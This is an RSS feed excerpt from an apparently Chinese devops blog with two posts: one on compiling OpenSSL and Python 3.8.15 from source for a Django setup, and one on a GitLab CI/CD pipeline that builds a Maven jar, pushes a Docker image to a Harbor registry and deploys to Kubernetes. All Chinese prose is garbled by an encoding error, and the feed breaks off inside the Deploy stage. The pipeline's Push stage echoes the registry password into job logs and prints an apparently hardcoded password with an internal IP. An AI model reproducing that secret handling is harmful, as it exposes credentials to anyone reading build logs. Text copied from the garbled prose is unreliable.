      <title>Pythonä¸‹Djangoç¯å¢ƒçš„å‡†å¤‡</title>
      <link>https://rendoumi.com/posts/20221027-python_django/</link>
      <pubDate>Thu, 27 Oct 2022 10:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20221027-python_django/</guid>
      <description>&lt;p&gt;å…¶å®æœ¬èº«è‡ªå·±æ˜¯æ¯”è¾ƒå–œæ¬¢ javascripts çš„ï¼Œä½†æ˜¯ Python ä¹Ÿæ˜¯å¿…é¡»æŒæ¡çš„ä¸€é¡¹æŠ€èƒ½ã€‚&lt;/p&gt;
&lt;p&gt;å¹² devops ansible è·Ÿ python ä¹Ÿè„±ä¸äº†å¹²ç³»ï¼Œæ‰€ä»¥å‡†å¤‡ç”¨ django å¼€å‘ä¸€ä¸ªè‡ªåŠ¨ä¸Šçº¿çš„ç³»ç»Ÿã€‚&lt;/p&gt;
&lt;p&gt;å…ˆå‡†å¤‡ä¸€ä¸‹ Python ä»¥åŠ Django çš„ç¯å¢ƒå¥½äº†ã€‚&lt;/p&gt;
&lt;h4 id=&#34;ä¸€å‡†å¤‡-python&#34;&gt;ä¸€ã€å‡†å¤‡ Python&lt;/h4&gt;
&lt;p&gt;ç§˜ç±ï¼Œä¸è¦ç”¨ä»€ä¹ˆ venv ä¹‹ç±»çš„ä¸œè¥¿ï¼Œæ±¡æŸ“ç¯å¢ƒã€‚ç›´æ¥ä¸‹è½½æºä»£ç ç¼–è¯‘å®‰è£…ï¼Œç„¶åæŠŠ py å°åˆ°è‡ªå·±çš„å¯†é—­æ˜¯ç‹é“ï¼Œæœ€åå¼•ç”¨ä¸€ä¸‹ $PATH ï¼Œæƒ³ç”¨å“ªä¸ªå°±ç”¨å“ªä¸ªã€‚&lt;/p&gt;
&lt;p&gt;æ³¨æ„ä»¥ä¸‹çš„æ­¥éª¤ï¼Œå…ˆè£… gcc çš„ç¼–è¯‘ç¯å¢ƒï¼Œç„¶åè£… openssl çš„é«˜ç‰ˆæœ¬ï¼Œå¹¶ä¸”é…ç½®å¥½ ldconfigï¼Œå¦åˆ™ py çš„ ssl ä¼šæŠ¥é”™ã€‚&lt;/p&gt;
&lt;p&gt;æœ€åä¸‹è½½ python 3.8.15 ç¼–è¯‘å®‰è£…ï¼Œç”Ÿäº§ç¯å¢ƒï¼Œæœ€å¥½é‡‡ç”¨æœ€æ–°ç‰ˆæœ¬å¾€åé”™ä¸¤ä¸ªç‰ˆæœ¬ã€‚&lt;/p&gt;
&lt;p&gt;ç¼–è¯‘å®‰è£…åˆ° /export/servers/python3ç›®å½•&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;yum -y install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gcc make libffi-devel

wget https://www.openssl.org/source/openssl-1.1.1q.tar.gz
./config --prefix=/export/servers/openssl

vi /etc/ld.so.conf
/export/servers/openssl/lib
ldconfig -v

wget https://www.python.org/ftp/python/3.8.15/Python-3.8.15.tgz
./configure --prefix=/export/servers/python3 --with-openssl=/export/servers/openssl --with-ssl-default-suites=openssl
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;æœ€åä¸€æ­¥ï¼š&lt;/p&gt;</description>
    </item>
    <item>
      <title>Gitlabçš„CICDå®é™…ç”Ÿäº§ç¯å¢ƒåº”ç”¨</title>
      <link>https://rendoumi.com/posts/20221025-gitlab_cicd/</link>
      <pubDate>Tue, 25 Oct 2022 10:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20221025-gitlab_cicd/</guid>
      <description>&lt;p&gt;Gitlab å’Œ Jenkins ä¸€æ ·ï¼Œéƒ½æ˜¯å¾ˆæµè¡Œçš„ CI/CD å·¥å…·ï¼Œå½“ç„¶ï¼Œæœ¬ç«™ä¹‹å‰æ¨è¿‡å›½äººè‡ªäº§çš„ä¸œè¥¿ onedevï¼Œé‚£ä¸ªä¹Ÿç›¸å½“ä¸é”™ï¼Œä½†æ˜¯ç”¨çš„äººæ¯•ç«Ÿè¿˜æ˜¯å°‘ï¼Œè¿™å›è¿˜æ˜¯ç”¨å¤§å®¶éƒ½è€³ç†Ÿèƒ½è¯¦çš„ä¸œè¥¿ã€‚&lt;/p&gt;
&lt;p&gt;æœ¬ç¯‡å°±æ˜¯ Giblab åœ¨ç”Ÿäº§ç¯å¢ƒæ‰“åŒ…å‘å¸ƒçš„ä¸€ä¸ªå…¨æµç¨‹ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;1666673866024&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20221025-gitlab_cicd/1666673866024.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;è§£é‡Šä¸€ä¸‹ä¸Šå›¾ï¼š&lt;/p&gt;
&lt;p&gt;é¦–å…ˆæœ‰ä¸¤å¥—Gitï¼Œä¸€å¥—æ˜¯ç¨‹åºå‘˜çš„Codeä»“åº“ï¼Œå¦ä¸€å¥—æ˜¯è¿ç»´çš„æ“ä½œä»£ç ï¼Œé‡Œé¢æ˜¯ä¸€äº›yamlå•Šï¼Œä¸€äº›ansibleè„šæœ¬å•Š&lt;/p&gt;
&lt;p&gt;ç„¶åæµç¨‹å°±æ˜¯å…ˆå–å‡ºç¨‹åºå‘˜çš„Codeï¼Œbuildå‡ºæ¥jarï¼Œç„¶åæ‰“æˆé•œåƒæ¨åˆ°ä»“åº“ï¼Œç„¶åå†å–å‡ºè¿ç»´çš„ä»£ç ï¼Œè¿›è¡Œåˆå¹¶ï¼Œç”Ÿæˆk8sçš„yamlæ–‡ä»¶ï¼Œæœ€åæ¨åˆ° kubernetes ä¸­å»ï¼Œè¿™æ ·æ•´ä¸ª GitOPS çš„æµç¨‹å°±å®Œå¤‡äº†&lt;/p&gt;
&lt;p&gt;åœ¨ gitlab ä¸­éå¸¸ç®€å•ï¼Œå°±æ˜¯ç¼–è¾‘ .gitlab-ci.yaml æ–‡ä»¶&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;image&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;docker:19.03.12&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;variables&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;DOCKER_DRIVER&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;overlay2&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;DOCKER_TLS_CERTDIR&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;MAVEN_OPTS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;-Dmaven.repo.local=.m2/repository&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;TIMEZONE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Asia/Shanghai&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;http_proxy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;https_proxy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;no_proxy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;cache&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;paths&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;.m2/repository/&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;target/&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;stages&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;build&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;push&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;deploy&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;Build&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;stage&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;build&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;image&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;maven:3.5-jdk-8-alpine&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;before_script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;export COMMIT_TIME=$(TZ=CST-8 date +%F-%H-%M)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;echo $COMMIT_TIME&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;echo &amp;#34;COMMIT_TIME=$COMMIT_TIME&amp;#34; &amp;gt;&amp;gt; build.env&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;./mvnw package&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;artifacts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;reports&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;dotenv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;build.env&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;tags&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;yunwei&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;Push&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;stage&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;push&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;before_script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;docker info || true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;echo &amp;#34;$HARBOR_REGISTRY $HARBOR_USERNAME $HARBOR_PASSWORD&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;echo &amp;#34;echo Dingfangwen | docker login 172.18.31.28 -u dingfangwen --password-stdin&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;echo -n $HARBOR_PASSWORD | docker login $HARBOR_REGISTRY -u $HARBOR_USERNAME --password-stdin&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;docker pull $HARBOR_REGISTRY_IMAGE:latest || true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;      docker build
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;      --cache-from $HARBOR_REGISTRY_IMAGE:latest
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;      --build-arg http_proxy=$http_proxy
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;      --build-arg https_proxy=$https_proxy
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;      --build-arg no_proxy=$no_proxy
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;      --cache-from HARBOR_REGISTRY_IMAGE:latest
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;      --tag $HARBOR_REGISTRY_IMAGE:$COMMIT_TIME
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;      --tag $HARBOR_REGISTRY_IMAGE:latest
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;      .&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;docker push $HARBOR_REGISTRY_IMAGE:$COMMIT_TIME&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;docker push $HARBOR_REGISTRY_IMAGE:latest&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;docker logout $HARBOR_REGISTRY&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;dependencies&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;Build&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;tags&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;yunwei&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;Deploy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;stage&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;deploy&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;cache&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;{}&lt;span class=&#34;w&#34;&gt;
